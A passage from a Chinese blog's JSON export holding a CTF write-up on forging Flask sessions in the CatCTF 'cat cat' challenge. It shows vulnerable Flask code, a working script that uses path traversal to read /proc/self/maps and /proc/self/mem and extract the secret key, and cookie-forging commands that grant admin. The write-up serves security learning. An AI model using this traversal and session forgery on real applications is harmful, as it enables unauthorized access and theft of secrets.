punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    detailtxt <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>listdir<span class=\"token punctuation\">(</span><span class=\"token string\">'./details/'</span><span class=\"token punctuation\">)</span>\n    cats_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> detailtxt<span class=\"token punctuation\">:</span>\n        cats_list<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span>i<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">\"index.html\"</span><span class=\"token punctuation\">,</span> cats_list<span class=\"token operator\">=</span>cats_list<span class=\"token punctuation\">,</span> cat<span class=\"token operator\">=</span>cat<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/info'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    filename <span class=\"token operator\">=</span> <span class=\"token string\">\"./details/\"</span> <span class=\"token operator\">+</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'file'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span>\n    start <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'start'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0\"</span><span class=\"token punctuation\">)</span>\n    end <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'end'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0\"</span><span class=\"token punctuation\">)</span>\n    name <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'file'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span>request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'file'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>\n\n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">\"detail.html\"</span><span class=\"token punctuation\">,</span> catname<span class=\"token operator\">=</span>name<span class=\"token punctuation\">,</span> info<span class=\"token operator\">=</span>cat<span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span> start<span class=\"token punctuation\">,</span> end<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/admin'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">admin_can_list_root</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'admin'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> flag\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        session<span class=\"token punctuation\">[</span><span class=\"token string\">'admin'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string\">\"NoNoNo\"</span>\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    app<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>host<span class=\"token operator\">=</span><span class=\"token string\">'0.0.0.0'</span><span class=\"token punctuation\">,</span> debug<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span> port<span class=\"token operator\">=</span><span class=\"token number\">5637</span><span class=\"token punctuation\">)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>首先映入眼帘的是flag部分</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">if</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>isfile<span class=\"token punctuation\">(</span><span class=\"token string\">\"/flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    flag <span class=\"token operator\">=</span> cat<span class=\"token punctuation\">(</span><span class=\"token string\">\"/flag\"</span><span class=\"token punctuation\">)</span>\n    os<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span><span class=\"token string\">\"/flag\"</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>这里的话可以看出是读取并删除flag文件，然后我们看哪里可以获取<code>flag</code>，看到admin路由</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/admin'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">admin_can_list_root</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'admin'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> flag\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        session<span class=\"token punctuation\">[</span><span class=\"token string\">'admin'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string\">\"NoNoNo\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>当<code>admin=1</code>时会返回flag，这个应该是需要伪造admin了，这里从源码中可以看出是Flask框架，所以这里的话应该就是Session伪造了，想要伪造<code>Session</code>，<code>Key</code>是必不可少的，我们这里注意到<code>Key</code>部分的代码</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">app<span class=\"token punctuation\">.</span>config<span class=\"token punctuation\">[</span><span class=\"token string\">'SECRET_KEY'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>uuid<span class=\"token punctuation\">.</span>uuid4<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"-\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"*abcdefgh\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>可以看到<code>Key</code>是随机生成uuid后去除<code>-</code>而后再拼接<code>*abcdefgh</code>组成的。 获取key的话，这里联想到Python存储对象的位置在堆上，我们这里的<code>app</code>是实例化的Flask对象，<code>key</code>的位置是<code>app.config[&#39;SECRET_KEY&#39;]</code>，所以我们理论上可以通过读取<code>/proc/self/mem</code>来读取key，但由于<code>/proc/self/mem</code>内容较多，同时存在不可读取的内容，直接读取它的话会导致程序崩溃，所以这里我们采用的方法是先读取<code>/proc/self/maps</code>获取堆栈分布，而后再在其中读取<code>/proc/self/mem</code>，读取对应位置的内容，接下来利用正则匹配筛选即可获取key，这个与蓝帽杯<code>file_session</code>中的获取key部分有异曲同工之妙，具体可以看这篇文章<br><a href=\"https://mp.weixin.qq.com/s/A9OmgHAmGLJPEL4cQBU8zQ\">https://mp.weixin.qq.com/s/A9OmgHAmGLJPEL4cQBU8zQ</a><br>然后读取文件部分的话，是<code>info</code>路由</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/info'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    filename <span class=\"token operator\">=</span> <span class=\"token string\">\"./details/\"</span> <span class=\"token operator\">+</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'file'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span>\n    start <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'start'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0\"</span><span class=\"token punctuation\">)</span>\n    end <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'end'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0\"</span><span class=\"token punctuation\">)</span>\n    name <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'file'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span>request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'file'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>\n\n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">\"detail.html\"</span><span class=\"token punctuation\">,</span> catname<span class=\"token operator\">=</span>name<span class=\"token punctuation\">,</span> info<span class=\"token operator\">=</span>cat<span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span> start<span class=\"token punctuation\">,</span> end<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>获取到三个可控参数，<code>start</code>和<code>end</code>以及<code>file</code>，我们这里可以参考蓝帽杯的Wp，简单修改一下参数和筛选规则，就可以得到key，构造脚本如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests<span class=\"token punctuation\">,</span> re\n\nurl <span class=\"token operator\">=</span> <span class=\"token string\">\"http://f014a421-a286-4ff6-a275-4fa0488315d6.ctfm.lxscloud.top/\"</span>\nmaps_url <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>url<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">/info?file=../../proc/self/maps\"</span></span>\nmaps_reg <span class=\"token operator\">=</span> <span class=\"token string\">\"([a-z0-9]&#123;12&#125;-[a-z0-9]&#123;12&#125;) rw.*?00000000 00:00 0\"</span>\nmaps <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span>maps_reg<span class=\"token punctuation\">,</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>maps_url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#print(maps)</span>\n<span class=\"token keyword\">for</span> m <span class=\"token keyword\">in</span> maps<span class=\"token punctuation\">:</span>\n    start<span class=\"token punctuation\">,</span> end <span class=\"token operator\">=</span> m<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\"-\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\"-\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n    start<span class=\"token punctuation\">,</span> end <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>start<span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>end<span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    read_url <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>url<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">/info?file=../../proc/self/mem&amp;start=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>start<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">&amp;end=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>end<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span>\n    s <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>read_url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>content\n    rt <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span><span class=\"token string\">b\"[a-z0-9]&#123;32&#125;\\*abcdefgh\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> rt<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>rt<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>运行结果如下图<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141554899.png\" alt=\"在这里插入图片描述\"><br>成功获取key，接下来利用<a href=\"https://github.com/noraj/flask-session-cookie-manager\">flask-session-cookie-manager</a>来伪造session<br>访问<code>admin</code>路由，获取session<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141554018.png\" alt=\"在这里插入图片描述\"><br>接下来我们进行解码</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">python flask_session_cookie_manager3<span class=\"token punctuation\">.</span>py decode <span class=\"token operator\">-</span>s <span class=\"token string\">\"密钥\"</span> <span class=\"token operator\">-</span>c <span class=\"token string\">\"Session值\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141554142.png\" alt=\"在这里插入图片描述\"><br>可以看到这里结果为<code>&#123;&#39;admin&#39;:0&#125;</code>，我们修改为<code>&#123;&#39;admin&#39;:1&#125;</code>，再对其进行加密</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">python flask_session_cookie_manager3<span class=\"token punctuation\">.</span>py encode <span class=\"token operator\">-</span>s <span class=\"token string\">\"28d470b5a8164df4b6c77ce187e52e6d*abcdefgh\"</span> <span class=\"token operator\">-</span>t <span class=\"token string\">\"&#123;'admin': 1&#125;\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141554205.png\" alt=\"在这里插入图片描述\"><br>接下来将伪造的Session值拿去替换掉网站的Session，再刷新界面<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141554197.png\" alt=\"在这里插入图片描述\"><br>成功获取到Flag</p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><a href=\"https://lxscloud.top/2022/10/09/CTF%E4%B8%ADPython_Flask%E5%BA%94%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/\">https://lxscloud.top/2022/10/09/Python_Flask</a><br><a href=\"https://www.leavesongs.com/PENETRATION/client-session-security.html\">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p>\n","feature":true,"text":"前言Flask的Session伪造之前并未有太多了解，在跨年夜的CatCTF中遇到了catcat这道题，因此对此类题目进行一个简单总结，lx56大师傅已经对Flask有很详细的介绍了，因此这里是站在巨人的肩膀上看世界了属于是，膜拜大佬。 Flask什么是Flask呢，他其实是一个...","link":"","photos":[],"count_time":{"symbolsCount":"8.4k","symbolsTime":"8 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"FLask","slug":"FLask","count":3,"path":"api/tags/FLask.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Flask\"><span class=\"toc-text\">Flask</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Session\"><span class=\"toc-text\">Session</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Key%E7%9A%84%E8%8E%B7%E5%8F%96\"><span class=\"toc-text\">Key的获取</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E9%A2%98%E7%9B%AE\"><span class=\"toc-text\">题目</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CTFshow%E5%86%85%E9%83%A8%E8%B5%9B-%E8%93%9D%E7%98%A6\"><span class=\"toc-text\">CTFshow内部赛[蓝瘦]</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#HCTF2018-admin\"><span class=\"toc-text\">[HCTF2018]admin</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CatCTF-cat-cat\"><span class=\"toc-text\">CatCTF[cat cat]</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0\"><span class=\"toc-text\">参考文章</span></a></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"简记一次Tp3框架审计之旅","uid":"9fb5d47ccfc09f50e02bb64494717cba","slug":"简记一次Tp3框架审计之旅","date":"2023-01-17T19:42:20.000Z","updated":"2024-02-14T07:40:46.000Z","comments":true,"path":"api/articles/简记一次Tp3框架审计之旅.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141548159.png","text":"前言MVC框架是代码审计必需学习的知识，这里以TpV3.2.3框架为例，进行一次对MVC框架代码的漏洞审计，简单学一下MVC的相关知识，希望对正在学习MVC框架的师傅有所帮助 框架我们这里首先需要了解一下什么是MVC架构 M：Model(模型)，其负责业务数据的处理和与数据库的交...","link":"","photos":[],"count_time":{"symbolsCount":"9.7k","symbolsTime":"9 mins."},"categories":[{"name":"代码审计","slug":"代码审计","count":7,"path":"api/categories/代码审计.json"}],"tags":[{"name":"代码审计","slug":"代码审计","count":6,"path":"api/tags/代码审计.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"从CTFShow[RCE挑战]中学习自增构造webshell","uid":"882cd13ace786346d67ca526dbf954fe","slug":"从CTFShow[RCE挑战]中学习自增构造webshell","date":"2022-12-07T15:26:30.000Z","updated":"2023-03-14T07:57:46.000Z","comments":true,"path":"api/articles/从CTFShow[RCE挑战]中学习自增构造webshell.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141557237.jpeg","text":"前言在CTFShow的每周挑战中遇到了PHP无数字字母构造的一系列题目，做了做发现我这个菜鸡不怎么会，所以对此类题进行一个简单总结，希望能对正在学习的师傅有所帮助。 构造语句的几种方式首先来看一下最原始的例题 &lt;?php highlight_file(__FILE__); ...","link":"","photos":[],"count_time":{"symbolsCount":"14k","symbolsTime":"12 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"CTF","slug":"CTF","count":4,"path":"api/tags/CTF.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}